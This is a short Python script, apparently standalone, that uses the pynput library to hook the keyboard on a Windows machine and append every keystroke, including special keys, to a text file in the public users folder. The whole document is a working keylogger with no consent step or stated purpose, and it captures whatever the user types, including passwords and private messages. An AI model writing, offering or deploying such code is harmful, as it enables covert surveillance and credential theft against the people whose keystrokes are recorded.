from pynput import keyboard

log_path = r"C:\Users\Public\global_log.txt"

def on_press(key):
    try:
        # Handles alphanumeric keys
        k = key.char
    except AttributeError:
        # Handles special keys (Space, Enter, etc.)
        k = f" [{key}] "

    with open(log_path, "a") as f:
        f.write(k)

# This sets up a "Listener" (a Windows Hook)
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
